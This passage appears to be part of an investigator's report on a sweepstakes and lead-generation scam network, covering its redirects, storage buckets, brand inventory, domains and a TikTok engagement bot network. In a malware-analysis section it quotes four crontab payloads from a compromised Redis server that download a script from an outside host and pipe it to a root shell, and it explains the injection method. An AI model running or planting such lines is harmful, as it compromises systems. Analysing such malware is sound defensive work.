The Lovable OG image hash `p98pqg` is a **valid project identifier** — `/projects/p98pqg` returns HTTP 307 (redirect). The project exists on Lovable's platform. No useful EXIF metadata in the OG image (standard PNG, 1200x629px, palette color).

### Cloudflare: No Intelligence in API Layer

The API redirect (`/api/continue` → phef6trk.com) is a dumb Cloudflare rule with no conditional logic:
- Same redirect regardless of User-Agent (iPhone, Android, desktop, TikTok, Googlebot, curl)
- Same redirect regardless of Accept-Language (English, Spanish, Portuguese, Chinese)
- Same redirect regardless of Referer (TikTok or none)
- Same redirect for GET and POST
- All responses are `cf-cache-status: DYNAMIC` (not cached)

Root domain and jessica subdomain serve **identical content** (SHA-256: `e3a85c35a43afd7735610614a87ff740d766fb83ea00510964437d53eca6d01c`).

Cloudflare diagnostic (`/cdn-cgi/trace`): colo=SJC (San Jose), TLS 1.3, SNI plaintext.

`/_routes.json` and `/functions/` both return 200 — Cloudflare Pages is the hosting platform.

### GTM Container: Google Ads Only

The GTM container (`GTM-N3JVLCTN`, 373KB) contains:
- Google Analytics: `G-BSTM4RV28F` (the only GA ID)
- Google Ads / DoubleClick conversion tracking
- References to `veinteractive.com` (Ve Global retargeting platform)
- No Facebook pixel, no TikTok pixel, no third-party tracking
- The scam page itself has **zero tracking** — no GA, no GTM, no pixels. Only the SEO blog tracks visitors.

### GCS Buckets: Limited Product Library

Both GCS buckets (`b.noodledit.com`, `sassets.noodledit.com`) are accessible via `storage.googleapis.com` directly (200). Brute-force enumeration of product names (Samsung, iPad, PlayStation, Xbox, gift cards, etc.) found no additional products. The operation currently only has iPhone and MacBook variants.

### CPA Network Analysis

ActiveProspect verification decodes to 16-byte value (UUID): `33e9946204c3129af10d401d71da1b2c`.

phef6trk.com DNS now includes an **IPv6 sinkhole address**: `fd25:ef1b:4b44:1::1` (in addition to the IPv4 `10.0.0.1`). Both A and AAAA records point to sinkhole addresses. NS records, MX, TXT, and SOA are all empty — the domain has been completely scrubbed.

### Coordinated Engagement Bot Network (Live, 2026-04-08)

During the investigation, the investigator's personal TikTok account received **multiple likes on old comments from separate accounts**, all within a short time window. This is live evidence of a coordinated engagement farming operation.

**Observed behavior:**
- "The Upgrade Club" (@jessytheupgradeclub) liked old comments
- "IDREES NAJIBI" liked old comments around the same time
- Additional accounts continued liking old comments throughout April 8, 2026
- The likes targeted comments the investigator had made on various videos — not just The Upgrade Club's own content

**Why this matters:**

TikTok does not expose a public "all comments by user" view. A normal user cannot browse someone's comment history across videos. To find and like a specific user's old comments scattered across different videos, you need one of:

1. Creator access to the videos (you can see all comments on your own content)
2. Manual scrolling through thousands of comments on specific videos
3. **Scraping tools or engagement automation software** that crawl comment sections and build target lists

Option 3 is the only explanation that accounts for:
- **Multiple unrelated accounts** liking the same user's old comments
- **Simultaneous timing** — the likes arrive in clusters, not randomly
- **Old comments** being found — not recent activity, but historical comments the user made days or weeks ago

**Mechanism:**

The operation maintains a **target list** of TikTok users who have interacted with content in their niche. When a user comments on a video in a relevant space (giveaways, tech drops, free stuff), their username gets scraped into the list. Automated tools then:

1. Find the target user's comments across various videos (via API scraping or comment section crawling)
2. Like those comments from multiple accounts in the network
3. Each like generates a notification on the target's phone: "[Account Name] liked your comment"
4. Curiosity drives the target to tap the notification → view the account profile
5. Profile bio contains a link ("Link in story") → scam funnel → CPA tracker

The accounts are different storefronts for the same operation. We already identified 10+ social media accounts across 4 platforms (Twitter, Instagram, TikTok, Facebook) under the brands GetnGoods, MyDailySurge, and The Upgrade Club.

**The irony:**

The engagement bot network is **still actively running** as of April 8, 2026. The bots are still farming. The target lists are still being worked. But every funnel they drive traffic to ultimately redirects to `phef6trk.com`, which resolves to `10.0.0.1`. The automation is grinding against a sinkholed tracker. The machine runs. The gears turn. Nothing happens.

**Evidence:**
- `tiktok/tiktok-activity-upgrade-club-liked.jpg` — Activity feed showing "The Upgrade Club liked your comment" + "IDREES NAJIBI liked your comment" in the same time window
- `tiktok/tiktok-profile-jessytheupgradeclub.jpg` — The Upgrade Club profile (58.4K followers, "Link in story")
- `tiktok/tiktok-comments-sword-guy.jpg` — Comment section where investigator was present (248 comments)

### Updated Statistics

```
Domains:               6  (was 5 — myamericanprizes.com discovered)
Subdomains:           21+ (historical)
Open ports on EC2:    11  (was 10 — port 465 discovered)
Social media accounts: 10+ across 4 platforms
Affiliate IDs:         7  (discovered via Wayback Machine)
Campaign IDs:          6+ (discovered via Wayback Machine)
Wayback snapshots:   116  (across all domains/subdomains)
Oldest evidence:      December 2023 (app.epicfunnels.net)
Spamhaus status:      LISTED (CSS)
M365 tenant:          DELETED
Bot network:          ACTIVE (still farming engagement into a sinkhole)
Working parts:         0
```

## Network Probe #3 (2026-04-09 04:20 UTC)

Full-spectrum network reconnaissance. Raw data in `artifacts/probe-2026-04-08/`.

### CRITICAL: Redis Contains Cryptojacking Malware

The 4 Redis keys (`backup1`-`backup4`) are **crontab-formatted malware injection payloads**:

```
backup1: */2 * * * * root cd1 -fsSL http://oracle.zzhreceive.top/b2f628/b.sh | sh
backup2: */3 * * * * root wget -q -O- http://oracle.zzhreceive.top/b2f628/b.sh | sh
backup3: */4 * * * * root curl -fsSL http://oracle.zzhreceive.top/b2f628fff19fda999999999/b.sh | sh
backup4: */5 * * * * root wd1 -q -O- http://oracle.zzhreceive.top/b2f628fff19fda999999999/b.sh | sh
```

This is a classic Redis crontab injection attack — automated botnets write cron entries into unauthenticated Redis, then `CONFIG SET dir /var/spool/cron/` to dump them as root's crontab. `cd1`/`wd1` are obfuscated `curl`/`wget` (malware renames binaries to evade detection).

The C2 domain `oracle.zzhreceive.top` is **dead** — no DNS, WHOIS says "does not exist" (expired .top domain via ZDNS registry). Redis CONFIG shows `dir=/data`, `dbfilename=dump.rdb` — Docker container defaults. The attack likely **failed** because the container filesystem can't reach `/var/spool/cron/`. But it proves the open Redis was found and exploited by automated malware scanners.

### CRITICAL: GCS Bucket `b.noodledit.com` — 747-Asset Scam Factory

Both GCS buckets are **publicly listable** (no auth required on `storage.googleapis.com`):

- **b.noodledit.com**: 747 objects, 122.4 MB, date range 2024-10-22 to **2026-04-08 (today)**
- **sassets.noodledit.com**: 28 objects, focused on MyDailySurge/PrizeZappy

Most recent uploads (within 48 hours of probe):
```
2026-04-08  creditcard.png
2026-04-06  OPG Housing.jpg, Picture2.jpg
2026-04-01  icon_phone.svg
2026-03-31  starbucks500.svg
2026-03-30  celinepurse.png, kawasakimotorcycle.png, hermespurse.png,
            norwegiancruiselinecruise.png, fordmavericktruck.png
```

#### 15+ Brand Names in Asset Inventory

| Brand | Category | Evidence |
|-------|----------|----------|
| GetnGoods | Sweepstakes | Known (jessica.epicfunnels.net) |
| MyDailySurge | Lead gen | Known (explore.mydailysurge.com) |
| PrizeZappy | Sweepstakes | logo_prizezappy.svg, Prize Zappy.svg |
| SnagNGoods | Sweepstakes | GetnGoods variant |
| PrizeZar | Sweepstakes | prizezar*.svg |
| PlayZoodle | Gaming | playzoodle_favicon.png (2026-03-20) |
| HealthPlanScouts | Health insurance | healthplanscouts_dark_logo.svg |
| Fresh Health Plan | Health insurance | logo_freshhealthplan.svg (2026-03-11) |
| LendliV2 | Lending/loans | LendliV2.svg |
| Prismique | Unknown | New prismique logo.svg |
| CheckGo | Unknown | CheckGo.svg |
| BenefitsAccessCenter | Gov benefits | benefitsaccesscenter*.svg |
| TheDailyTipJar | Unknown | thedailytipjar*.svg |
| OPG Housing | Housing assistance | OPG Housing.jpg (2026-04-06) |
| CustomerTestConnect | Platform backend | myamericanprizes.com error page title |

#### Promotion Categories (from `promotions/` directory)

**Gift Cards**: Amazon $500/$1000, Walmart $750/$1000, Kroger $1000, Target, Dollar Tree $1000, Chipotle, Chick-fil-A $750, Publix $750, Casey's $750, Red Lobster $1000, Outback $1000, McDonald's, Starbucks $500, Macy's, Shein, Speedway $750

**Vehicles**: GMC Canyon, Ford Maverick, Nissan Frontier, Chevrolet Colorado, Toyota RAV4, Corvette, Honda motorcycle, Indian Scout motorcycle, Kawasaki motorcycle

**Luxury**: Celine purse, Hermes purse, E.l.f. cosmetics, perfume set, Ticketmaster, bedding set $1000

**Gas Stations**: BP $750, Shell $750, Exxon $750, Speedway $750, gas card $500/$1000

**Government Benefits Scams**: Food stamps/SNAP, inflation relief, stimulus checks, unemployment, rental assistance, student aid, startup grants, senior benefits, child/family assistance, tariff relief, unclaimed money

**Electronics**: iPhone 17 Pro Max, MacBook, PlayStation 5, Samsung, Nintendo, JBL PartyBox 310, DeWalt, E-Bike, Smart Walking Stick

**Travel**: Norwegian cruise line, Princess Cruises

This is not a sweepstakes operation with a few gift card prizes. This is an **industrial-scale, multi-vertical CPA lead generation factory** spanning consumer goods, vehicles, luxury items, gas rewards, government benefits fraud, health insurance, lending, and gaming.

### CRITICAL: Operating Entity Identified — Moxxi Media

myamericanprizes.com DKIM selectors reveal the Microsoft 365 tenant name:

```
selector1._domainkey → selector1-myamericanprizes-com._domainkey.moxximedia.onmicrosoft.com
selector2._domainkey → selector2-myamericanprizes-com._domainkey.moxximedia.onmicrosoft.com
```

**Moxxi Media** (`moxximedia.onmicrosoft.com`) is the entity operating myamericanprizes.com. The domain `moxximedia.com` is **not registered** — they only exist as a Microsoft 365 tenant. M365 tenant verification: `MS=ms46839871`.

Additional myamericanprizes.com intelligence:
- **Platform**: Express.js (Node.js) with Handlebars templates
- **Error page title**: "Oops - CustomerTestConnect" (the backend platform name)
- **Theme directory**: `/themes/myamericanprizes/`
- **ActiveProspect verification**: `DdrUnuCT8xESAT7uOdJmqg==`
- **Apple domain verification**: `ySS9fHR4xXuFRiE0`
- **DMARC**: `p=none` with reporting to Cloudflare
- **MX**: `myamericanprizes-com.mail.protection.outlook.com` (M365 Exchange)
- **Autodiscover**: Full M365 integration (autodiscover.outlook.com)

Note: epicfunnels.net has a **different** M365 tenant (`MS=ms66511106`, now deleted) while myamericanprizes.com uses `MS=ms46839871` (Moxxi Media, active). Two separate M365 tenants.

### Domain Registration Timeline (WHOIS)

| Domain | Created | Registrar | Expires | Status |
|--------|---------|-----------|---------|--------|
| myamericanprizes.com | **2023-08-22** | GoDaddy | 2026-08-22 | Active, full lock |
| phef6trk.com | 2024-06-25 | Squarespace | 2026-06-25 | Sinkholed, DNSSEC |
| noodledit.com | 2024-10-18 | Cloudflare | 2026-10-18 | Active (GCS CDN only) |
| mydailysurge.com | 2025-03-19 | Cloudflare | **2027-03-19** | Active, renewed 2 yrs |
| epicfunnels.net | 2025-08-26 | Sav.com | 2026-08-26 | Active |
| olivimails.com | — | — | **EXPIRED** | No WHOIS match |

Key: myamericanprizes.com is the **oldest domain** (Aug 2023). noodledit.com, mydailysurge.com, and myamericanprizes.com share **identical Cloudflare nameservers** (cass/felicity) — same Cloudflare account. olivimails.com has **expired** but the EC2 still uses it as the Hestia hostname.

### SSL Certificate Findings

**mydailysurge.com has 35 SANs** — a daily rotation scheme:

```
DNS: mydailysurge.com, www.mydailysurge.com, signup.mydailysurge.com,
     trck.mydailysurge.com, 1.mydailysurge.com through 31.mydailysurge.com
```

One subdomain per day of the month. All numbered subdomains return 404 now — the rotation system is dead.

**noodledit.com cert renewed 4 days ago** (2026-04-04) — infrastructure actively maintained.

**CT log history**: myamericanprizes.com has 42 certs dating to Sep 2023. phef6trk.com has 17 certs (only `www.phef6trk.com`). olivimails.com has **zero** CT entries — never had a proper SSL cert.

### Updated Statistics

```
Domains:                6  (olivimails.com now expired)
Brand names:           15+ (was 2 — massive expansion from GCS bucket inventory)
GCS bucket objects:   775  (747 + 28 across two buckets)
GCS bucket size:      122.4 MB
Promotion categories:   8  (gift cards, electronics, vehicles, luxury, gas, gov benefits, health, travel)
Last asset upload:     2026-04-08 (day of probe)
Operating entity:      Moxxi Media (moxximedia.onmicrosoft.com)
Platform backend:      CustomerTestConnect (Express.js + Handlebars)
Redis status:          COMPROMISED by cryptojacking botnet (attack failed)
M365 tenants:          2 (ms66511106 deleted, ms46839871 active)
CT log entries:        130+ (across all domains)
Registrars used:       4 (GoDaddy, Squarespace, Cloudflare, Sav.com)
Working parts:         0 (monetization still broken — tracker sinkholed)
```
